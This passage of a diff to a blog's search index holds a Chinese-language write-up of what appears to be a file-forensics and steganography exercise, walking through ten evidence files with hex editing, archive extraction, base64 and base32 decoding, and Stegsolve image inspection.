+<td align="center">f5b9ce3e485314c23c40a89d994b2dc8</td>
+</tr>
+<tr>
+<td align="center">evidence 5</td>
+<td align="center">RVlYt.zip</td>
+<td align="center">3f67593f11669c72a36bad4d41a83a78</td>
+</tr>
+<tr>
+<td align="center">evidence 6</td>
+<td align="center">mkjRv.7z</td>
+<td align="center">e610fcd2a0cd53d158e8ee4bb088100a</td>
+</tr>
+<tr>
+<td align="center">evidence 7</td>
+<td align="center">OR8iq.xml</td>
+<td align="center">28ba933c31fd60f8c4461aed14a8c447</td>
+</tr>
+<tr>
+<td align="center">evidence 8</td>
+<td align="center">8cFQj.py</td>
+<td align="center">7fccfb1778b15fbc09deb6690afc776a</td>
+</tr>
+<tr>
+<td align="center">evidence 9</td>
+<td align="center">jMH7w.xlsx</td>
+<td align="center">523c407180d54dde6eca700405599c8a</td>
+</tr>
+<tr>
+<td align="center">evidence 10</td>
+<td align="center">01d98.gif</td>
+<td align="center">d708444963b79da344fd71e5c72f7f02</td>
+</tr>
+</tbody></table>
+<h3 id="evidence-1"><a href="#evidence-1" class="headerlink" title="evidence 1"></a>evidence 1</h3><p>在auto中找到eg2kx.jpg，保存到本地</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619144320915-1400398092.png" alt="image-20240619144319921"></p>
+<p>放到kali里查看下文件，发现里面有个压缩包</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619144343298-1732351595.png" alt="image-20240619144344786"></p>
+<p>后缀修改.zip，打开压缩包</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619144358900-1499432232.png" alt="image-20240619144400692"></p>
+<p>certutil -hashfile filename md5 使用cmd终端求出源文件hash码</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619144422045-534872133.png" alt="image-20240619144423655"></p>
+<h3 id="evidence-2"><a href="#evidence-2" class="headerlink" title="evidence 2"></a>evidence 2</h3><p>ZQOo2.jpg用kali分析</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619144448282-781821382.png" alt="image-20240619144450039"></p>
+<p>修改成zip文件需要密码，拉到010修改参数</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619144530235-441168608.png" alt="image-20240619144531862"></p>
+<h3 id="evidence-3"><a href="#evidence-3" class="headerlink" title="evidence 3"></a>evidence 3</h3><p>p3qQ4.jpg</p>
+<p>打开就是图片没显示完全 </p>
+<p>HEX 十六进制 </p>
+<p>DEC 十进制 </p>
+<p>OCT 八进制 </p>
+<p>BIN 二进制 </p>
+<p>00 00 02 80 代表宽度 </p>
+<p>00 00 01 92 代表高度</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619144801830-207600106.png" alt="image-20240619144803532"></p>
+<p>将高度十进制修改成1000，十六进制就是03 E8</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619144821301-1590599293.png" alt="image-20240619144822803"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619144836124-1454248698.png" alt="image-20240619144837626"></p>
+<h3 id="evidence-4"><a href="#evidence-4" class="headerlink" title="evidence 4"></a>evidence 4</h3><p>nsOh2.png 直接显示了</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619144902699-273714854.png" alt="image-20240619144904197"></p>
+<h3 id="evidence-5"><a href="#evidence-5" class="headerlink" title="evidence 5"></a>evidence 5</h3><p>RVlYt.zip</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145022732-277350086.png" alt="image-20240619145024416"></p>
+<p>另一张图片并没有什么 用010打开发现两张图片中间含有base64解码 搜索45 4E 44 是结尾16进制表示</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145038737-505191824.png" alt="image-20240619145040368"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145048790-1484432092.png" alt="image-20240619145050523"></p>
+<p>或者使用kali解码</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145103329-617948950.png" alt="image-20240619145105118"></p>
+<h3 id="evidence-6"><a href="#evidence-6" class="headerlink" title="evidence 6"></a>evidence 6</h3><p>mkjRv.7z</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145152522-1763155048.png" alt="image-20240619145154340"></p>
+<p> kali分析 修改成mpeg文件 使用audacity打开</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145207591-468728145.png" alt="image-20240619145209317"></p>
+<h3 id="evidence-7"><a href="#evidence-7" class="headerlink" title="evidence 7"></a>evidence 7</h3><p>OR8iq.xml</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145259439-134986905.png" alt="image-20240619145301158"></p>
+<p>stegsolve查看</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145309375-539765797.png" alt="image-20240619145311255"></p>
+<h3 id="evidence-8"><a href="#evidence-8" class="headerlink" title="evidence 8"></a>evidence 8</h3><p>8cFQj.py</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145401004-1996773354.png" alt="image-20240619145402450"></p>
+<p>010 查看到末尾都是二进制，用python进行每8组为单位转换对应十进制 发现结尾都是base32</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145425364-1203702419.png" alt="image-20240619145427107"></p>
+<p>进行在线转换，32-&gt;64-&gt;32-&gt;hex-&gt;32-&gt;64-&gt;32</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145443457-1463861147.png" alt="image-20240619145445087"></p>
+<h3 id="evidence-9"><a href="#evidence-9" class="headerlink" title="evidence 9"></a>evidence 9</h3><p> jMH7w.js</p>
+<p>kali分析</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145530875-351864068.png" alt="image-20240619145532632"></p>
+<p>改成压缩包后打开xlsx表格，拉住界面标红</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145537662-348434671.png" alt="image-20240619145539415"></p>
+<h3 id="evidence-10"><a href="#evidence-10" class="headerlink" title="evidence 10"></a>evidence 10</h3><p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145600268-2100879050.png" alt="image-20240619145602089"></p>
+<p>Stegsolve.jar打开</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145612824-854213073.png" alt="image-20240619145614500"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145622522-57668868.png" alt="image-20240619145624224"></p>
+]]></content>
+      <categories>
+        <category>writeup</category>
       </categories>
   </entry>
 </search>
